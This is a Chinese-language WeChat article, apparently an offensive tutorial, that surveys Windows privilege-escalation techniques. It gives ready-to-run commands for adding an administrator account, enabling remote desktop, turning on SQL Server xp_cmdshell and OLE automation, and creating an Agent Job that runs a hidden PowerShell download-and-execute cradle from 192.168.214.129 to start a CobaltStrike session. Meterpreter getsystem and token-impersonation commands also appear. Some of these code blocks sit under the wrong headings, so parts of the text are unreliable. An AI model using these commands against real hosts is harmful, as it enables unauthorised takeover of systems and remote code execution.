> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yneVLSUOrAwBGpBWmTwi5g)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)  

> **文章来****源：****Bypass**

当获取主机权限时，我们总是希望可以将普通用户提升为管理员用户，以便获得高权限完全控制目标主机。Windows 常用的提权方式有：内核提权、数据库提权、系统配置错误提权、组策略首选项提权、Bypass UAC 提权、令牌窃取提权等姿势。

**1、内核溢出漏洞提权**

由于目标系统没有及时安装补丁，攻击者可以利用 Windows 系统内核溢出漏洞进行提权，轻易获取 system 权限。

（1）通过 systeminfo 比对 KB 编号，发现系统是否存在漏洞。

github 项目地址：

```
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```

（2）找到对应漏洞的 exp 执行，获取 system 权限

github 项目地址：

```
https://github.com/SecWiki/windows-kernel-exploits
```

（3）添加管理员

```
net user 用户名 密码 /add
net localgroup Administrators 用户名 /add
```

（4）开启远程桌面

```
# 开启远程
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
# 查询远程端口
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
```

**2、数据库提权**

**2.1 MySQL 提权**

利用 mysql 的几种提权方式，如 udf 提权、mof 提权、启动项提权等。

```
udf提权：通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。
mof提权：在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。
启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。
```

**2.2 SQL Server 提权**

利用 SQL Sercer 执行系统命令的方式也有多种，比如 xp_cmdshell、SP_OACREATE、沙盒、Agent Job、CLR 来提权。

1、使用 xp_cmdshell 进行提权

```
# 启用xp_cmdshell
EXEC master..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC master..sp_configure 'xp_cmdshell', 1;RECONFIGURE;
# 通过xp_cmdshell执行系统命令
Exec master.dbo.xp_cmdshell 'whoami'
```

2、SP_OACREATE

```
# 开启组件
EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'show advanced options', 0;
# 执行系统命令（无回显）
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami'
```

3、通过沙盒执行命令

```
# 开启沙盒
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
# 利用jet.oledb执行命令
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
```

4、通过 Agent Job 执行命令

修改开启 Ageent Job，执行无回显 CobaltStrike 生成 powershell 上线

```
USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';
```

**3、系统配置错误提权**

**3.1 权限配置错误**

如果管理员权限配置错误，将导致低权限用户对高权限运行的文件拥有写入权限，那么低权限用户就可以替换成恶意后门文件，获取系统权限。一般在启动项、计划任务，服务里查找错误配置，尝试提权。

**3.2 可信任服务路径漏洞**

当一个服务的可执行文件路径含有空格，却没有使用双引号引起来，那么这个服务就存在漏洞。根据优先级，系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。

**3.3 不安全的注册表权限配置**

如果低权限用户对程序路径所对应的键值有写权限，那么就可以控制这个服务，运行后门程序，从而获取权限。

```
# 存储Windows服务有关的信息
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
# 服务对应的程序路径存储
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service\服务名\ImagePath
3.4 AlwaysInstallElevated
```

```
msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac 
meterpreter > getuid
meterpreter > getsystem
```

注册表键 AlwaysInstallElevated 是一个策略设置项。windows 允许低权限用户以 System 权限运行安装文件。如果启用此策略设置项，那么任何权限用户都能以 NT AUTHORITY\SYSTEM 权限来安装恶意的 MSI(Microsoft Windows Installer) 文件。

**4、组策略首选项提权**

SYSVOL 是域内的共享文件夹，用来存放登录脚本、组策略脚本等信息。当域管理员通过组策略修改密码时，在脚本中引入用户密码，就可能导致安全问题。

（1）访问 SYSVOL 共享文件夹，搜索包含 “cpassword” 的 XML 文件，获取 AES 加密的密码。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4kwplROZmicJMJjkibwo2JKfcmYC7HAicmPWiabkPEBFqkMiaZdUc2MpPTftkByFkyyFq59woY3E64Uq3Q/640?wx_fmt=png)

（2）使用 kali 自带的 gpp-decrypt 进行破解

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4kwplROZmicJMJjkibwo2JKfcu9iaiczpyYCXjlmjnPyoPxItgicZ3Z78libibMOo3NXOibMRWiaaRtgHV6v3A/640?wx_fmt=png)

**5、Bypass UAC 提权**

UAC(User Account Control，用户账号控制)，是微软引入的一种安全机制。Bypass UAC 提权，可以将管理员权限提升到 system 权限。

使用 msf 模块：

```
meterpreter > use incognito           #进入incognito模块
meterpreter > list_tokens -u          #列出令牌
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"   #模拟令牌
```

**6、令牌窃取提权**

通过窃取令牌获取管理员权限，在 MSF 中，可以使用 incognito 实现 token 窃取。

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

推荐文章 ++++

![](https://mmbiz.qpic.cn/mmbiz_jpg/US10Gcd0tQFGib3mCxJr4oMx1yp1ExzTETemWvK6Zkd7tVl23CVBppz63sRECqYNkQsonScb65VaG9yU2YJibxNA/640?wx_fmt=jpeg)

*[Linux 提权的几种常用方式](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650499072&idx=3&sn=8c16858820d264d2f09859f5bc0c5351&chksm=83ba0de4b4cd84f2668fcef33d2a5c798f07e2cc56200113e0a4606ca496694bd1d6aec585df&scene=21#wechat_redirect)

* [环境变量法提权](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650496934&idx=3&sn=1e5c3f5384bfee60ba1f8bb8d4abcac8&chksm=83ba3a42b4cdb354f47b042640653177c4b96eaf6ce2790374812ca6cbef6193e41f2d2d96d3&scene=21#wechat_redirect)

* [系统内核溢出提权](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650484019&idx=3&sn=17b399ab383633255dddbc1711aac935&chksm=83ba48d7b4cdc1c1695195d6bacf52dd306bdf82e75d4a4beaedfdc88e3fe56f298e4073be5f&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)